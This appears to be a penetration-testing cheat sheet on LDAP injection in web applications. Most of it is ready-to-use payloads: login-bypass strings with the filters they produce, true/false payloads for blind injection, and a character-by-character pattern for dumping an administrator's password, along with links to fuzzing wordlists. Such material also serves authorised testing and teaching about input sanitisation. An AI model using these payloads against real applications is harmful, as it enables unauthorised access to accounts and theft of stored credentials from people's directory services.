**[[389, 636, 3268, 3269 - LDAP | LDAP]] Injection** is an attack targeting web applications that construct LDAP statements from user input. It occurs when the application **fails to properly sanitise** input, allowing attackers to **manipulate LDAP statements** through a local proxy, potentially leading to unauthorised access or data manipulation.

# Login Bypass
LDAP supports several formats to store the password: clear, md5, smd5, sh1, sha, crypt. So, it could be that independently of what you insert inside the password, it is hashed.
```
user=*
password=*
--> (&(user=*)(password=*))
# The asterisks are great in LDAPi

user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))

user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))

user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))

user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed

user=admin)(&)
password=pwd
--> (&(user=admin)(&))(password=pwd) #Can through an error

username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) —> As (|) is FALSE then the user is admin and the password check is True.

username=*
password=*)(&
--> (&(user=*)(password=*)(&))
```

## Wordlists

- [LDAP_FUZZ](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt)
- [LDAP Attributes](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_attributes.txt)
- [LDAP PosixAccount attributes](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)

# Blind Injection
```
#This will result on True, so some information will be shown
Payload: *)(objectClass=*))(&objectClass=void
Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))

#This will result on True, so no information will be returned or shown
Payload: void)(objectClass=void))(&objectClass=void
Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
```

# Dump Data
```
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
```

# References
- [https://hacktricks.wiki/en/pentesting-web/ldap-injection.html](https://hacktricks.wiki/en/pentesting-web/ldap-injection.html)
- [https://portswigger.net/kb/issues/00100500_ldap-injection](https://portswigger.net/kb/issues/00100500_ldap-injection)